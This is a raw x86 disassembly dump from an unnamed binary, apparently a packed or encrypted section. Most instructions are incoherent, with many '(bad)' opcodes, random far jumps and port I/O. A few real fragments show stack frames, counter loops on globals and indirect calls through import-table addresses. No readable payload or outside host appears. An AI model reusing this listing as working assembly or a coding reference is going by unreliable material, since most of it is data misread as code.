  403ff4:	cmp    bl,BYTE PTR [eax+0x42]
  403ff7:	add    eax,0xd2346ae9
  403ffc:	sub    DWORD PTR [esi],eax
  403ffe:	xor    ecx,edx
  404000:	jo     0x404000
  404002:	xor    al,0xb5
  404004:	mov    cl,0x9c
  404006:	mov    bl,BYTE PTR [edx-0x66]
  404009:	test   eax,0x500dfb5c
  40400e:	jne    0x403fe9
  404010:	push   eax
  404011:	out    dx,al
  404012:	out    dx,eax
  404013:	adc    ebx,DWORD PTR [edx*4+0x4cd840ab]
  40401a:	pop    ebx
  40401b:	bound  esi,QWORD PTR [ebp-0x64217a20]
  404021:	push   ebx
  404022:	mov    eax,ds:0x5674c3d1
  404027:	adc    eax,DWORD PTR [esi]
  404029:	mov    esp,0x89a7fb12
  40402e:	and    ah,cl
  404030:	iret   
  404031:	ds idiv edi
  404034:	out    0xd4,eax
  404036:	(bad)  
  404037:	mov    eax,ds:0x1814e4c7
  40403c:	adc    DWORD PTR [eax+0x65],esp
  40403f:	jns    0x403ffc
  404041:	push   0xfce6fe0c
  404046:	sbb    eax,0x7a071970
  40404b:	dec    edi
  40404c:	enter  0x3393,0xc6
  404050:	cld    
  404051:	jno    0x4040bd
  404053:	ja     0x40406b
  404055:	and    cl,BYTE PTR [ecx+0x173805b2]
  40405b:	add    al,0x63
  40405d:	sbb    edx,DWORD PTR [ebp+0x1]
  404060:	pop    es
  404061:	popf   
  404062:	es int 0x4
  404065:	div    eax
  404067:	out    dx,al
  404068:	mov    edx,0xf690d66d
  40406d:	pushf  
  40406e:	ja     0x40402c
  404070:	fsubr  st,st(6)
  404072:	icebp  
  404073:	push   ebx
  404075:	inc    ebx
  404076:	sub    DWORD PTR [ebx-0x22],ebp
  404079:	sbb    DWORD PTR ds:0x82e6b4ba,esp
  40407f:	les    ebp,FWORD PTR [ebx+0x6b]
  404082:	call   0x9e60:0xad1552e8
  404089:	cmp    dh,0x94
  40408c:	nop
  40408d:	push   edx
  40408e:	cmp    BYTE PTR [ebx+0x743051b],dl
  404094:	jae    0x404035
  404096:	cmp    esi,ebp
  404098:	mov    eax,0x6f7c16c0
  40409d:	jb     0x4040b5
  40409f:	popf   
  4040a0:	shl    DWORD PTR [eax+0x6de3891],cl
  4040a6:	jnp    0x404071
  4040a8:	aad    0xbb
  4040aa:	jecxz  0x404047
  4040ac:	sub    ebp,DWORD PTR [esi]
  4040ae:	mov    ch,0x81
  4040b0:	enter  0xd148,0xb5
  4040b4:	fcomp  DWORD PTR [esi]
  4040b6:	jne    0x404073
  4040b8:	(bad)  
  4040b9:	pmaxsw mm5,QWORD PTR [ecx-0xb8a7efc]
  4040c0:	mov    ?,ebp
  4040c2:	add    eax,0x2b7e900
  4040c7:	add    BYTE PTR [eax],al
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0x3df7e6c1
  4040e3:	mov    ds:0x269eee6f,eax
  4040e8:	js     0x404162
  4040ea:	(bad)  
  4040eb:	jle    0x404165
  4040ed:	js     0x404131
  4040ef:	stos   BYTE PTR es:[edi],al
  4040f0:	out    0x58,al
  4040f2:	dec    edx
  4040f3:	pushf  
  4040f4:	fdiv   QWORD PTR [eax]
  4040f6:	pop    es
  4040f7:	fstp   QWORD PTR [eax+0x1e4d6dee]
  4040fd:	daa    
  4040fe:	add    eax,0xdf629f88
  404103:	fwait
  404104:	inc    esp
  404106:	retf   0x356f
  404109:	(bad)  
  40410a:	mov    al,ds:0x28a63ed4
  40410f:	bound  esi,QWORD PTR [esi]
  404111:	or     DWORD PTR [eax-0x6fa3c57f],edi
  404117:	jle    0x4040f0
  404119:	jmp    0xbb6f:0xf8f5b7e8
  404120:	imul   esi,DWORD PTR [edx+ecx*8+0x7c38c925],0xffffffee
  404128:	mov    ch,0x0
  40412a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40412b:	jne    0x40411b
  40412d:	mov    al,ds:0xfb161b8a
  404132:	inc    eax
  404133:	or     al,0x87
  404135:	pop    esi
  404136:	test   DWORD PTR [ebx+edi*4],0x7ea9bfac
  40413d:	imul   eax,DWORD PTR [ebp-0x535eaea7],0x36
  404144:	into   
  404145:	lea    esi,[edi+0x790b9a9d]
  40414b:	ret    
  40414c:	adc    eax,0x27becaaf
  404151:	ror    BYTE PTR [ebp+0x3eb5378a],cl
  404157:	add    al,0xcb
  404159:	or     al,0x3e
  40415b:	inc    edi
  40415c:	add    eax,0x24855bf6
  404161:	xchg   ebp,eax
  404162:	int    0x26
  404164:	mov    dl,0x72
  404166:	in     al,0x1b
  404168:	aaa    
  404169:	jg     0x4040fa
  40416b:	jnp    0x404143
  40416d:	or     ebp,DWORD PTR [ebx-0x231234b0]
  404173:	xor    ebx,edx
  404175:	fs inc esp
  404177:	wrmsr  
  404179:	sti    
  40417a:	mov    BYTE PTR [ebx],cl
  40417c:	dec    edx
  40417d:	pusha  
  40417e:	call   0x51acb83b
  404183:	mov    ds:0x84c01d3e,al
  404188:	push   0xd75d2e0c
  40418d:	dec    esi
  40418e:	enter  0x6b5d,0xb1
  404192:	cmp    eax,0x353a0b16
  404197:	jns    0x4041f1
  404199:	dec    edx
  40419a:	dec    ebx
  40419b:	pop    es
  40419c:	lods   eax,DWORD PTR ds:[esi]
  40419d:	mov    bh,0x32
  40419f:	push   ebx
  4041a0:	push   cs
  4041a1:	mov    ?,WORD PTR [eax]
  4041a3:	mov    ds:0x435f13d0,al
  4041a8:	dec    edi
  4041a9:	mov    esi,0x57af1e6
  4041ae:	test   DWORD PTR [edx+0x35],ecx
  4041b1:	dec    edx
  4041b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041b4:	ds (bad) 
  4041b6:	test   eax,0xe3a36ebd
  4041bb:	mov    esp,0x9bb796aa
  4041c0:	stc    
  4041c1:	lahf   
  4041c2:	or     edi,DWORD PTR [ebx-0x25dbe2b9]
  4041c8:	(bad)  
  4041c9:	pop    ss
  4041ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041cb:	mov    ds:0xc88dc6b1,al
  4041d0:	xor    esp,DWORD PTR [edi]
  4041d2:	lea    esp,[edx-0x5c]
  4041d5:	or     al,0x25
  4041d7:	(bad)  
  4041d8:	xchg   esp,eax
  4041d9:	in     eax,dx
  4041da:	pop    edx
  4041db:	inc    ecx
  4041dc:	out    0xa5,al
  4041de:	fdivp  st(7),st
  4041e0:	rol    bl,cl
  4041e2:	sub    BYTE PTR [eax+0x7b01479d],0xdb
  4041e9:	xchg   esp,eax
  4041ea:	es popa 
  4041ec:	add    bh,bl
  4041ee:	push   0x96d891d6
  4041f3:	ja     0x4041a7
  4041f5:	test   ecx,esp
  4041f7:	popf   
  4041f8:	xor    al,0x17
  4041fa:	sar    DWORD PTR [ecx+eax*1-0x28],0x35
  4041ff:	mov    ch,0xcc
  404201:	mov    dh,0x51
  404203:	cdq    
  404204:	mov    ah,0x8
  404206:	mov    cl,0x29
  404208:	popa   
  404209:	neg    DWORD PTR [edx-0x2f]
  40420c:	or     BYTE PTR [edx],al
  40420e:	mov    al,0xcc
  404210:	imul   edi,DWORD PTR [ebx+0x16],0xc90e893
  404217:	mov    ah,0x71
  404219:	pop    esp
  40421a:	xor    ah,0x56
  40421d:	push   ebx
  40421e:	sbb    edx,esi
  404220:	adc    bh,dl
  404222:	add    esi,DWORD PTR ds:0x1271d396
  404228:	sbb    al,0x63
  40422a:	mov    WORD PTR [eax],cs
  40422c:	imul   esi,DWORD PTR [edx+ecx*8],0x47a3c19f
  404233:	pop    esi
  404234:	mov    edx,0xbacbb1f9
  404239:	bound  esp,QWORD PTR [esi+edi*4-0x1]
  40423d:	pusha  
  40423e:	dec    ecx
  40423f:	jns    0x40427f
  404241:	xor    DWORD PTR [ebx+0x48235151],ebp
  404247:	push   0xb50e6333
  40424c:	jmp    0x6d646f6a
  404251:	push   0xffffffe4
  404253:	push   edi
  404254:	push   ebx
  404255:	mov    edx,0xcae658c3
  40425a:	or     DWORD PTR [ecx+eax*1-0x3d1c110c],0x58
  404262:	jmp    0x2094c634
  404267:	vminss xmm1,xmm3,DWORD PTR [ebx-0xe]
  40426c:	in     eax,dx
  40426d:	sbb    eax,0x471da918
  404272:	and    al,0xc8
  404274:	sub    dl,cl
  404276:	jns    0x404244
  404278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404279:	test   al,0xd2
  40427b:	xchg   edx,eax
  40427c:	add    ebp,ebp
  40427e:	in     al,0x68
  404280:	addr16 shl ebp,cl
  404283:	xor    BYTE PTR [eax+0x6fa4f083],bl
  404289:	or     esp,0xf176fb92
  40428f:	jmp    0xfc55b8ad
  404294:	pop    esp
  404295:	mov    esi,0x804021ae
  40429a:	pop    eax
  40429b:	sti    
  40429c:	jno    0x40425a
  40429e:	in     al,0x5f
  4042a0:	sub    edi,DWORD PTR [esi+0xb88ab8d]
  4042a6:	outs   dx,DWORD PTR ds:[esi]
  4042a7:	ins    DWORD PTR es:[edi],dx
  4042a8:	mov    esi,0x100850e5
  4042ad:	dec    eax
  4042ae:	and    DWORD PTR [ebp-0x6a],esi
  4042b1:	mov    dh,0xe1
  4042b3:	xchg   BYTE PTR ds:0xf89ab4c6,dl
  4042b9:	and    bl,BYTE PTR [eax+0x7dff2256]
  4042bf:	cwde   
  4042c0:	jb     0x404291
  4042c2:	ja     0x4042b4
  4042c4:	push   edi
  4042c5:	test   BYTE PTR [edx+eiz*8+0x53],0xb5
  4042ca:	lahf   
  4042cb:	cmp    bh,dh
  4042cd:	pushf  
  4042ce:	adc    BYTE PTR [eax],cl
  4042d0:	mov    esi,0xc94b977d
  4042d5:	or     BYTE PTR [ebp+0x3bb1e5ba],al
  4042db:	inc    ecx
  4042dc:	aam    0x77
  4042de:	mov    eax,ds:0x76c42d79
  4042e3:	mov    BYTE PTR [ecx-0x69],ah
  4042e6:	pop    ebp
  4042e7:	jns    0x404359
  4042e9:	xor    eax,0x9ef4ffa0
  4042ee:	push   cs
  4042ef:	repnz pop ds
  4042f1:	push   ss
  4042f2:	sbb    bh,al
  4042f4:	mov    ch,BYTE PTR [ecx]
  4042f6:	dec    edi
  4042f7:	cmp    edx,edi
  4042f9:	pop    edx
  4042fa:	fcmovnb st,st(4)
  4042fc:	loopne 0x40429f
  4042fe:	ins    DWORD PTR es:[edi],dx
  4042ff:	sbb    DWORD PTR [edx+0x5dc68b2],ebp
  404305:	mov    esi,0xc7959907
  40430a:	enter  0x1c1a,0xcc
  40430e:	push   esp
  40430f:	repnz ror BYTE PTR [ecx+0x56],0xf1
  404314:	sub    BYTE PTR [ebp+0x6b],ch
  404317:	cmp    DWORD PTR [ecx],edi
  404319:	add    DWORD PTR [esi+0x1],edx
  40431c:	dec    edi
  40431d:	hlt    
  40431e:	or     DWORD PTR [esi+ecx*2+0x62],0xffffffb1
  404323:	daa    
  404324:	das    
  404325:	loope  0x404345
  404327:	xlat   BYTE PTR ds:[ebx]
  404328:	jnp    0x4042f8
  40432a:	es adc al,0x5f
  40432d:	xchg   esp,eax
  40432e:	arpl   WORD PTR [edi+edx*2-0x29a9a98d],bp
  404335:	pushf  
  404336:	or     esi,DWORD PTR [eax+0x20d93725]
  40433c:	or     cl,dl
  40433e:	imul   ebp,DWORD PTR [ebx-0x5c7f4613],0xffffffec
  404345:	dec    ebx
  404346:	mov    edi,0x1ab53c61
  40434b:	inc    edi
  40434c:	mov    ch,0x14
  40434e:	daa    
  40434f:	xor    eax,0xeb02c836
  404354:	bound  edx,QWORD PTR [ebx-0x60167781]
  40435a:	xchg   edi,eax
  40435b:	push   es
  40435c:	rcr    ch,0xc0
  40435f:	ret    
  404360:	ja     0x4043b7
  404362:	add    DWORD PTR [eax],eax
  404364:	in     eax,dx
  404365:	mov    eax,0x98e182b7
  40436a:	xlat   BYTE PTR ds:[ebx]
  40436b:	dec    edi
  40436c:	icebp  
  40436d:	sub    DWORD PTR [ecx+ebx*8],edx
  404370:	mov    DWORD PTR [eax],ecx
  404372:	mov    eax,DWORD PTR [ebp+0xc]
  404375:	mov    eax,DWORD PTR [ebp+0x8]
  404378:	push   DWORD PTR [ebp-0x8]
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	and    al,0x26
  40441b:	adc    eax,0x782b1c80
  404420:	js     0x40446f
  404422:	jle    0x40449c
  404424:	js     0x404435
  404426:	outs   dx,BYTE PTR ds:[esi]
  404427:	and    BYTE PTR [edi-0x40],0xe3
  40442b:	aam    0xef
  40442d:	push   es
  40442e:	sbb    dl,BYTE PTR [edi-0x23b5ed87]
  404434:	mov    ch,ch
  404436:	test   al,0xd7
  404438:	sbb    ah,BYTE PTR [ecx+0x4e876142]
  40443e:	daa    
  40443f:	loopne 0x404437
  404441:	stos   DWORD PTR es:[edi],eax
  404442:	in     eax,dx
  404443:	inc    ecx
  404444:	rcl    DWORD PTR [ebx-0x66b77a7],cl
  40444a:	outs   dx,DWORD PTR ds:[esi]
  40444b:	outs   dx,BYTE PTR cs:[esi]
  40444d:	call   0x7502:0xec41a06d
  404454:	sbb    ecx,DWORD PTR [ebx+0x4]
  404457:	ror    BYTE PTR [edi+0x76],cl
  40445a:	mov    cl,0xa
  40445c:	add    eax,0xd260a8cb
  404461:	xchg   edx,eax
  404462:	xchg   esp,eax
  404463:	ror    BYTE PTR [edi],cl
  404465:	pop    esi
  404466:	fstp   QWORD PTR [edx-0x3c37f5f0]
  40446c:	jecxz  0x4044a9
  40446e:	xor    al,0xd2
  404470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404471:	retf   0x99c7
  404474:	inc    ebx
  404475:	jne    0x4044c8
  404477:	mov    dl,0x46
  404479:	dec    ebp
  40447a:	sub    al,0x69
  40447c:	jp     0x404405
  40447e:	inc    ecx
  40447f:	rcl    DWORD PTR [eax],cl
  404481:	pushf  
  404482:	sbb    eax,0x8ee0f62b
  404487:	add    BYTE PTR ds:0x6133b9b,ch
  40448d:	xor    edx,esp
  40448f:	std    
  404490:	xchg   BYTE PTR [edi-0x46],dl
  404493:	ins    DWORD PTR es:[edi],dx
  404494:	shr    BYTE PTR [esp+eax*1+0x3b],cl
  404498:	(bad)  
  404499:	or     DWORD PTR ds:0xe3819b96,esi
  40449f:	xchg   ebp,eax
  4044a0:	int    0x85
  4044a2:	mov    dh,0xe2
  4044a4:	xchg   esp,eax
  4044a5:	mov    bl,0x4f
  4044a7:	nop
  4044a8:	jno    0x404453
  4044aa:	xor    ebx,DWORD PTR [eax-0xdfe51e1]
  4044b0:	or     edx,eax
  4044b2:	sub    DWORD PTR [ebx+edx*2+0x5759b015],ebp
  4044b9:	xor    BYTE PTR [ebx+0x77],cl
  4044bc:	pop    ds
  4044bd:	mov    edx,0x3e8472c
  4044c2:	and    eax,0xd65233a1
  4044c7:	(bad)  
  4044c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c9:	fiadd  DWORD PTR [edx+0x32f5bf82]
  4044cf:	cwde   
  4044d0:	test   eax,0x90c02737
  4044d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044d6:	bound  esp,QWORD PTR [edi+0x66]
  4044d9:	and    ebp,DWORD PTR [eax]
  4044db:	cmp    al,ah
  4044dd:	adc    DWORD PTR [edx],ebp
  4044df:	ins    BYTE PTR es:[edi],dx
  4044e0:	shr    BYTE PTR [ebp-0x2a],0xc8
  4044e4:	ins    DWORD PTR es:[edi],dx
  4044e5:	stc    
  4044e6:	and    ebx,DWORD PTR [eax]
  4044e8:	ins    BYTE PTR es:[edi],dx
  4044e9:	jp     0x4044a5
  4044eb:	and    DWORD PTR [eax],esp
  4044ed:	enter  0x88d4,0x1f
  4044f1:	ror    DWORD PTR [ebp-0x7d],1
  4044f4:	fnsave [edx+0x6e7506eb]
  4044fa:	jno    0x404548
  4044fc:	xlat   BYTE PTR ds:[ebx]
  4044fd:	xchg   ecx,eax
  4044fe:	cmp    DWORD PTR [edi+0x60ca7a51],edi
  404504:	xor    eax,0x122fc0c6
  404509:	in     al,dx
  40450a:	stos   DWORD PTR es:[edi],eax
  40450b:	fadd   DWORD PTR [ecx-0x38]
  40450e:	push   esi
  40450f:	in     eax,dx
  404510:	and    ecx,DWORD PTR [eax]
  404512:	adc    al,0x6b
  404514:	push   ss
  404515:	cmp    al,0x60
  404517:	mov    al,ds:0xd0dbc46f
  40451c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40451e:	sbb    bl,BYTE PTR [ecx+ebp*8]
  404521:	mov    BYTE PTR [edx],bl
  404523:	sub    BYTE PTR [ebp-0x5689b584],cl
  404529:	adc    al,0x80
  40452b:	cmp    al,0xaf
  40452d:	and    al,0x18
  40452f:	aad    0x83
  404531:	or     DWORD PTR [esi-0x3d],ebp
  404534:	(bad)  
  404535:	fbld   TBYTE PTR [ebx+0x3b]
  404538:	jmp    0x73e884ee
  40453d:	ja     0x404544
  40453f:	push   edx
  404540:	fadd   DWORD PTR ds:0xb9e19bf8
  404546:	sbb    eax,0xade0955d
  40454b:	cmp    bp,dx
  40454e:	out    0xff,eax
  404550:	jmp    0xbd3ae74
  404555:	mov    eax,ds:0x2214555
  40455a:	shl    DWORD PTR [esi],1
  40455c:	push   ss
  40455d:	mov    WORD PTR [edx-0x3c],ss
  404560:	push   es
  404561:	in     eax,dx
  404562:	ins    BYTE PTR es:[edi],dx
  404563:	inc    ecx
  404564:	por    mm1,QWORD PTR [ebx+0x33c36813]
  40456b:	pop    edx
  40456c:	or     esi,DWORD PTR [ebx]
  40456e:	int    0xce
  404570:	dec    edi
  404571:	sub    al,0x6c
  404573:	jecxz  0x4045a9
  404575:	mov    esp,0x99da17ed
  40457a:	pop    ss
  40457b:	inc    eax
  40457c:	or     bl,BYTE PTR [edx+0x6654b30d]
  404582:	in     al,dx
  404583:	and    esi,DWORD PTR [ebx+0x65]
  404586:	(bad)  
  404587:	push   ss
  404588:	jl     0x40459c
  40458a:	jge    0x4045b0
  40458c:	adc    BYTE PTR [eax+0x46],ch
  40458f:	sub    esp,DWORD PTR [ecx+0x32]
  404592:	outs   dx,DWORD PTR ds:[esi]
  404593:	imul   ecx,DWORD PTR [eax+0x6e725ae3],0xffffffd8
  40459a:	add    dh,BYTE PTR [esp+edx*1-0x36b91f0b]
  4045a1:	xchg   ebx,eax
  4045a2:	jno    0x40461b
  4045a4:	cmp    cl,BYTE PTR [eax+0x67]
  4045a7:	iret   
  4045a8:	outs   dx,BYTE PTR ds:[esi]
  4045a9:	ins    DWORD PTR es:[edi],dx
  4045aa:	inc    edx
  4045ab:	popf   
  4045ac:	xchg   DWORD PTR [ebp+eiz*8+0x2613dd62],edx
  4045b3:	fcom   DWORD PTR [esi+0x59c9427e]
  4045b9:	xchg   BYTE PTR [ebx],dh
  4045bb:	xchg   BYTE PTR [ecx],cl
  4045bd:	sub    ecx,DWORD PTR [edx+0x2f6ddfd1]
  4045c3:	fbstp  TBYTE PTR [eax]
  4045c5:	lds    eax,FWORD PTR [ebp+0x27374402]
  4045cb:	cmp    eax,0x24bc95e9
  4045d0:	mov    edx,0x48148bf2
  4045d5:	sub    DWORD PTR ds:0x7665a7ca,ebx
  4045db:	popa   
  4045dc:	ss xchg ebx,eax
  4045de:	stos   BYTE PTR es:[edi],al
  4045df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045e0:	ds into 
  4045e2:	and    ch,al
  4045e4:	lods   al,BYTE PTR ds:[esi]
  4045e5:	jns    0x404616
  4045e7:	add    ebp,esi
  4045e9:	cli    
  4045ea:	ffreep st(0)
  4045ec:	xchg   esp,eax
  4045ed:	fstp   DWORD PTR [ebp+esi*4+0x3b]
  4045f1:	rol    bl,1
  4045f3:	push   edi
  4045f4:	mov    ebp,esp
  4045f6:	fs int3 
  4045f8:	stos   DWORD PTR es:[edi],eax
  4045f9:	ror    BYTE PTR [edx+0x6e],1
  4045fc:	sub    DWORD PTR [edi],0xfffffff3
  4045ff:	add    al,0x0
  404601:	fstp   DWORD PTR [ebx]
  404603:	jb     0x4045ce
  404605:	jp     0x4045d6
  404607:	popa   
  404608:	xor    cl,ah
  40460a:	push   es
  40460b:	sbb    cl,dh
  40460d:	xchg   esi,eax
  40460e:	dec    edx
  40460f:	adc    eax,0x70d8fbf6
  404614:	adc    bh,BYTE PTR [ebx]
  404616:	rol    BYTE PTR [ecx+eiz*4],cl
  404619:	push   0xffffff8b
  40461b:	push   ebx
  40461c:	dec    ebp
  40461d:	std    
  40461e:	lea    ebp,[eax+0x22]
  404621:	clc    
  404622:	lds    edi,FWORD PTR [ebx]
  404624:	ss lahf 
  404626:	xor    al,0x4a
  404628:	test   BYTE PTR [ecx],bl
  40462a:	shl    DWORD PTR [edx],0x21
  40462d:	repnz adc eax,0x4ba644cf
  404633:	add    al,0xcd
  404635:	adc    eax,edx
  404637:	cdq    
  404638:	in     eax,dx
  404639:	mov    ds:0xe8c84142,eax
  40463e:	ins    DWORD PTR es:[edi],dx
  40463f:	fcmovne st,st(0)
  404641:	lea    ecx,[ecx+0x3e]
  404644:	cdq    
  404645:	inc    edi
  404646:	cld    
  404647:	cmc    
  404648:	pop    ebp
  404649:	je     0x40467c
  40464b:	inc    edx
  40464c:	xor    ch,bl
  40464e:	mov    al,ds:0x3b789e01
  404653:	inc    esp
  404654:	ss loope 0x404668
  404657:	adc    DWORD PTR [ebp-0x5f40bf0b],ebx
  40465d:	add    esp,DWORD PTR [edx+0xeb57173]
  404663:	jmp    0x4ced:0xc2eb10ae
  40466a:	dec    esi
  40466b:	push   ebx
  40466c:	jae    0x404674
  40466e:	push   edi
  40466f:	dec    ebx
  404670:	inc    edi
  404671:	(bad)  
  404672:	cwde   
  404673:	lock add DWORD PTR [ebp+0x4c52a92b],eax
  40467a:	(bad)  
  40467b:	jmp    0x3c4eef0f
  404680:	pop    es
  404681:	test   BYTE PTR [ebx],bl
  404683:	stc    
  404684:	push   es
  404685:	dec    esp
  404686:	sbb    al,0xd0
  404688:	cmp    al,0x6f
  40468a:	enter  0x1dc0,0xe5
  40468e:	inc    esi
  40468f:	sbb    BYTE PTR [edi+0x6bd15562],al
  404695:	sub    BYTE PTR [ecx],al
  404697:	test   DWORD PTR [esi+ebp*8-0x63],ebp
  40469b:	mov    ch,BYTE PTR [eax+edx*4]
  40469e:	and    eax,0xf81682f3
  4046a3:	mov    esi,0x1af87c57
  4046a8:	fs mov bh,0xff
  4046ab:	and    eax,0x4285e89d
  4046b0:	aad    0x1
  4046b2:	inc    ebp
  4046b3:	dec    eax
  4046b4:	pop    ds
  4046b5:	inc    esp
  4046b6:	or     BYTE PTR [eax+0x261d54b1],bh
  4046bc:	inc    edi
  4046bd:	out    dx,eax
  4046be:	add    dh,BYTE PTR [ebp+edi*8+0x610b69f]
  4046c5:	stos   BYTE PTR es:[edi],al
  4046c6:	icebp  
  4046c7:	cld    
  4046c8:	cwde   
  4046c9:	and    eax,0x5c37f952
  4046ce:	pop    ss
  4046cf:	ss cwde 
  4046d1:	xlat   BYTE PTR ds:[ebx]
  4046d2:	scas   al,BYTE PTR es:[edi]
  4046d3:	sub    eax,0x6a582542
  4046d8:	jl     0x404755
  4046da:	mov    cl,cl
  4046dc:	cmp    ebx,ecx
  4046de:	push   ds
  4046df:	xchg   esp,eax
  4046e0:	ficomp DWORD PTR [ebx+0x19]
  4046e3:	jl     0x40468c
  4046e5:	add    eax,0x4d7dfc14
  4046ea:	xor    eax,0x5c1e5ced
  4046ef:	or     BYTE PTR [ecx],dh
  4046f1:	xchg   ecx,eax
  4046f2:	aad    0xc6
  4046f4:	inc    eax
  4046f5:	out    dx,al
  4046f6:	xchg   edx,eax
  4046f7:	add    al,0x56
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x85fc83de
  404770:	xor    al,0x7f
  404772:	jno    0x40479d
  404774:	js     0x4047ee
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x40472f
  40477b:	pop    ecx
  40477c:	adc    ch,BYTE PTR [edx+0x61]
  40477f:	ja     0x4047e7
  404781:	sbb    al,0x7a
  404783:	inc    esi
  404784:	into   
  404785:	stos   DWORD PTR es:[edi],eax
  404786:	nop
  404787:	mov    eax,0x5fb72829
  40478c:	mov    ebx,0x1ca0ad8d
  404791:	cmp    bh,BYTE PTR [edi+0x433b1657]
  404797:	test   al,0xe8
  404799:	or     ebp,DWORD PTR [edx]
  40479b:	and    DWORD PTR [ecx],eax
  40479d:	in     eax,dx
  40479e:	adc    eax,0x9e83e697
  4047a3:	adc    ebx,DWORD PTR [edx-0x70417840]
  4047a9:	fwait
  4047aa:	ja     0x404786
  4047ac:	mov    cl,0x83
  4047ae:	pop    ebp
  4047af:	add    eax,0xca56e219
  4047b4:	sbb    DWORD PTR [eax-0x72],ebx
  4047b7:	mov    dl,0x7d
  4047b9:	test   DWORD PTR [edx],ecx
  4047bb:	dec    esp
  4047bc:	ins    BYTE PTR es:[edi],dx
  4047bd:	or     ebp,DWORD PTR [edx+0x4d21babc]
  4047c3:	adc    eax,0x6c7cea1
  4047c8:	sub    bl,BYTE PTR [edx+0x39d79d92]
  4047ce:	(bad)  
  4047cf:	maskmovq mm7,(bad)
  4047d0:	idiv   DWORD PTR [ecx+ebx*4-0x20e046ca]
  4047d7:	aad    0xe4
  4047d9:	xchg   ebp,eax
  4047da:	pop    ds
  4047db:	jg     0x4047d0
  4047dd:	adc    al,0x50
  4047df:	xor    ebp,ebp
  4047e1:	mov    edi,0xc30cd3f6
  4047e6:	mov    bl,0x6e
  4047e8:	dec    ebx
  4047e9:	ins    BYTE PTR es:[edi],dx
  4047ea:	std    
  4047eb:	or     al,0x33
  4047ed:	fiadd  DWORD PTR [esi+0x34b61572]
  4047f3:	mov    ebx,ds
  4047f5:	dec    esp
  4047f6:	leave  
  4047f7:	mov    dh,BYTE PTR [eax]
  4047f9:	xor    eax,0x2bcb3261
  4047fe:	xor    ebp,ebx
  404800:	out    dx,eax
  404801:	lea    edi,[ebx]
  404803:	test   BYTE PTR [esi+edx*8-0x4759aa74],al
  40480a:	(bad)
  40480e:	lahf   
  40480f:	sub    al,bl
  404811:	mov    ecx,0xcc45e059
  404816:	std    
  404817:	lods   al,BYTE PTR ds:[esi]
  404818:	jecxz  0x4047fe
  40481a:	int3   
  40481b:	inc    esp
  40481c:	cwde   
  40481d:	loop   0x404892
  40481f:	loopne 0x404832
  404821:	int    0xea
  404823:	fwait
  404824:	inc    ecx
  404825:	into   
  404826:	loop   0x4047fe
  404828:	loope  0x4048a9
  40482a:	mov    ds:0x39e58ee,eax
  40482f:	fldcw  WORD PTR [edi+0x194f526e]
  404835:	(bad)  
  404836:	jno    0x4047eb
  404838:	aas    
  404839:	xchg   ecx,eax
  40483a:	cli    
  40483b:	stc    
  40483c:	outs   dx,BYTE PTR ds:[esi]
